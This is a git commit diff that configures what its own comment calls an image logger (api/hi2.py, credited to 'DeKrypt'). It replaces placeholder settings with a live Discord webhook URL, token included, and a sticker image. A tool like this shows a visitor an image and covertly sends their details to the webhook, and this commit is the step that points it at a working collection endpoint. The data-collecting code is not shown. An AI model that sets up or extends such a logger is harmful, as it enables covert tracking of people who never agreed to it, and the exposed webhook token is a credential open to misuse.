bdd1b51cfb10c68a4866b6b714b879044e37f0d6
ggomhhhdy <ademe8758@gmail.com>
2025-11-30 20:45:41 +0100

    Update hi2.py

--- api/hi2.py
+++ api/hi2.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444770797796196404/vg0XOePH-PEU6bHD4JFzehxLDHmUBx9Lkn1UYTx3KzhSUYT7L04gXelB3_F604TXRyzB",
+    "image": "https://cdn.stickers.gg/stickers/84526-wow.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
